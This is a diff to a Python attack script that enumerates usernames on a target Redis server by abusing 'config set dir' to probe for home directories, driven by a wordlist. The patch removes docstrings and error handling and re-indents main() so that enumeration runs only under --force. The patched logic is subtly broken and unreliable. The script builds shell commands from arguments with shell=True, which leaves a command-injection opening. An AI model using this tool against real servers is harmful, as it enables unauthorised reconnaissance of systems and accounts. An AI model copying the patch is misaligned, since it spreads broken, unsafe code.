@@ -9,18 +9,11 @@ import argparse
 import sys
 
 def run_redis_command(command):
-    """Executes a Redis command using subprocess and returns the output."""
-    try:
-        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        return result.decode('utf-8').strip()
-    except subprocess.CalledProcessError as e:
-        print(f"Command error: {e.output.decode().strip()}")
-        if "NOAUTH" in e.output.decode().strip():
-            print("Authentication error: Please check your password.")
-        sys.exit(1)
+    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    return result.decode('utf-8').strip()
+   
 
 def test_redis_connection(ip, port, password):
-    """Tests the Redis connection by sending a ping command."""
     print('Testing Redis server connectivity...')
     auth_part = f"-a {password}" if password else ""
     test_cmd = f'redis-cli {auth_part} -p {port} -h {ip} ping'
@@ -32,7 +25,6 @@ def test_redis_connection(ip, port, password):
         sys.exit(1)
 
 def check_directory_enumeration(ip, port, password):
-    """Checks if directory enumeration is possible."""
     print('Detecting if usernames are enumerable...')
     auth_part = f"-a {password}" if password else ""
     cmd = f'redis-cli {auth_part} -p {port} -h {ip} config set dir /34345465869586985669879ThisIsNotADrectory158469485966548908908457894675897'
@@ -41,10 +33,8 @@ def check_directory_enumeration(ip, port, password):
         print('Usernames likely can be enumerated!')
     else:
         print('Usernames cannot be enumerated... Sorry')
-        sys.exit()
 
 def enumerate_usernames(ip, port, username_list, password):
-    """Attempts to enumerate usernames by setting directories."""
     auth_part = f"-a {password}" if password else ""
     for name in username_list:
         name = name.strip()
@@ -61,20 +51,16 @@ def main():
     parser.add_argument('-w', '--wordlist', help='Recommended Wordlist: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', required=True)
     parser.add_argument('-f', '--force', help='Skip testing and force enumeration', action='store_true')
     parser.add_argument('-pass', '--password', help='Password for authentication', type=str, default="")
-
     args = parser.parse_args()
 
-    try:
-        with open(args.wordlist, "r") as username_list:
-            if not args.force:
-                test_redis_connection(args.ip, args.port, args.password)
-                check_directory_enumeration(args.ip, args.port, args.password)
-            else:
-                print("Careful... Tests are disabled!")
+    
+    with open(args.wordlist, "r") as username_list:
+        if not args.force:
+            test_redis_connection(args.ip, args.port, args.password)
+            check_directory_enumeration(args.ip, args.port, args.password)
+        else:
+            print("Careful... Tests are disabled!")
             enumerate_usernames(args.ip, args.port, username_list, args.password)
-    except Exception as e:
-        print(f"Failed to open or process wordlist: {e}")
-        sys.exit(1)
 
 if __name__ == "__main__":
     main()
